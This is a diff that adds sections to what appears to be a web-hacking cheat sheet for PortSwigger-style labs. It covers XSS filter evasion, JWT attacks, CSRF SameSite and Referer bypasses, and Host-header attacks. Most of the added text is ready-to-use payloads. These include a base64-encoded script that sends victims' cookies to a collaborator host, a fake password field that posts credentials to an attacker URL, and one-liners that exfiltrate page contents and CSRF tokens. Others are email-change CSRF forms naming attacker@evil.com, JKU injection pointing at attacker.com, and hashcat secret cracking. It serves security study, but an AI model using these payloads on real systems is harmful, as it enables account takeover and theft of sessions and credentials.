@@ -1107,7 +1107,45 @@ setInterval(function(){with(document)body.appendChild(createElement('script')).s
 | 5 | Blacklist check: does `<svg>` work? Does `<ScRiPt>` work? |
 | 6 | **If filter exists = vulnerability exists.** Chase that filter across the ENTIRE app. |
 
-#### **4.1.10 XSS Decision Tree**
+#### **4.1.11 Advanced Evasion & Data Exfiltration**
+
+**Base64 Encoded Payload Bypass**
+```javascript
+// evAl(atob()) — bypasses WAFs that block "alert" keyword
+<script>eval(atob('YWxlcnQoMSk='))</script>  // atob decodes: alert(1)
+
+// Steal cookie via base64:
+<script>eval(atob("ZmV0Y2goJ2h0dHBzOi8vQ09MTEFCLz9jPScrYnRvYShkb2N1bWVudC5jb29raWUpKQ=="))</script>
+
+// Generate base64:
+echo -n "fetch('https://COLLAB/?c='+btoa(document.cookie))" | base64
+```
+
+**String.fromCharCode Bypass**
+```javascript
+// Convert payload to char codes — bypasses keyword detection
+echo -n "alert(1)" | python3 -c "import sys; print(','.join(str(ord(c)) for c in sys.stdin.read()))"
+// Output: 97,108,101,114,116,40,49,41
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+```
+
+**Credential Harvester (phishing input fields via XSS)**
+```javascript
+// Injects fake login form → sends credentials to attacker
+<input name=username id=username>
+<input type=password name=password onchange="if(this.value.length)fetch('https://COLLAB/',{method:'POST',mode:'no-cors',body:username.value+':'+this.value})">
+```
+
+**One-Liner Data Exfiltration**
+```javascript
+// Read victim's page content via XSS:
+fetch('https://TARGET/accountDetails',{credentials:'include'}).then(r=>r.text()).then(d=>location='https://COLLAB/?d='+btoa(d))
+
+// CSRF token steal + use:
+var r=new XMLHttpRequest();r.open('GET','/accountDetails',false);r.withCredentials=true;r.send();var t=r.responseText.match(/csrf.+value="(\w+)"/)[1];new XMLHttpRequest().open('POST','/email/change');new XMLHttpRequest().send('csrf='+t+'&email=atk@evil.com')
+```
+
+#### **4.1.12 XSS Decision Tree**
 
 ```
 Test XSS entry point
@@ -1525,6 +1563,19 @@ jwt_tool <token> -X i
 # If server uses RSA public key, but accepts HS256,
 # HMAC-sign with the public key as secret
 jwt_tool <token> -X k -pk public.pem
+
+# 7. JKU injection — point to attacker's JWKS URL
+# Header: {"alg":"RS256","jku":"https://attacker.com/jwks.json"}
+# Host jwks.json with your public key → server fetches and trusts it
+jwt_tool <token> -X s -ju https://attacker.com/jwks.json
+
+# 8. KID path traversal → /dev/null
+# {"alg":"HS256","kid":"/dev/null"}
+# Server reads /dev/null (empty) as HMAC secret → sign with empty string
+jwt_tool <token> -T -kc ""
+
+# Brute-force weak secret with hashcat
+hashcat -a 0 -m 16500 <token> /usr/share/wordlists/jwt-secrets.txt
 ```
 
 **MFA/2FA Bypass (7 Patterns)**
@@ -1700,6 +1751,53 @@ csrf_token=null
 ```bash
 # Many GraphQL endpoints accept GET for mutations
 GET /graphql?query=mutation{deleteUser(id:1)}
+```
+
+**SameSite Strict Bypass — Client-Side Redirect**
+```bash
+# If target has open redirect or path traversal in redirect:
+# 1. User visits attacker page → redirects to target's own redirect
+# 2. Target's redirect sends user to the vulnerable endpoint
+# 3. Since it's a same-site navigation → SameSite=Strict satisfied
+
+<script>
+  location = "https://target.com/post/comment/confirmation?postId=../../my-account/change-email?email=attacker@evil.com%26submit=1"
+</script>
+```
+
+**SameSite Lax Bypass — Cookie Refresh via OAuth**
+```bash
+# OAuth/SSO login refreshes cookies with SameSite=Lax in 2 minutes window
+<form action="https://target.com/my-account/change-email" method="POST">
+  <input name="email" value="attacker@evil.com">
+</form>
+<script>
+  window.open("https://target.com/social-login");  // triggers OAuth → refreshes cookies
+  setTimeout(() => document.forms[0].submit(), 5000);  // wait for refresh, then CSRF
+</script>
+```
+
+**Referer Validation Bypass**
+```bash
+# 1. Suppress Referer header entirely
+<meta name="referrer" content="no-referrer">
+
+# 2. Spoof Referer to match expected domain pattern
+<script>
+  history.pushState("", "", "/?target.com/")  // inject target's domain into URL
+  document.forms[0].submit();
+</script>
+
+# 3. Check if Referer is required at all — try removing it
+# Some servers: no Referer header = skip validation
+```
+
+**Method Spoofing**
+```bash
+# Convert POST CSRF to GET via method override params
+GET /my-account/change-email?email=att@evil.com&_method=POST
+GET /my-account/change-email?email=att@evil.com&method=POST
+# Alternative params: @method, _http_method, X-HTTP-Method-Override
 ```
 
 ---
@@ -2616,6 +2714,40 @@ Host: 169.254.169.254            # Routes to cloud metadata
 ```bash
 # If the app uses the Host to construct absolute URLs in responses
 # and your Host value is reflected in: <script src="https://EVIL_HOST/script.js">
+```
+
+**Connection State Attack — Bypass Host Validation**
+```bash
+# Send 2 requests in single connection. 1st validates host, 2nd uses different host.
+# Burp: Send to Repeater → enable HTTP/1.1 connection reuse
+## REQUEST 1 — establishes connection, valid host
+GET / HTTP/1.1
+Host: legitimate.target.com
+Connection: keep-alive
+
+## REQUEST 2 — host validation already passed!
+GET /admin HTTP/1.1
+Host: localhost:6566
+Connection: keep-alive
+# ⚠️ PortSwigger exam tip: SSRF is always at localhost:6566
+```
+
+**Tab/Indented Host Header Bypass**
+```bash
+# Legit Host on 1st line, indented malicious Host on 2nd
+GET / HTTP/1.1
+	Host: localhost:6566        # ← TAB-indented (backend might read this!)
+Host: legitimate.target.com     # ← frontend validates this
+
+# Try 1, 2, 3 tabs — different parsers handle differently
+```
+
+**Port Delimiter Dangling Markup**
+```bash
+# Inject after port number
+GET / HTTP/1.1
+Host: target.com:'<a href="//COLLAB/steal?
+# Captures page content via dangling markup from Host header
 ```
 
 ---
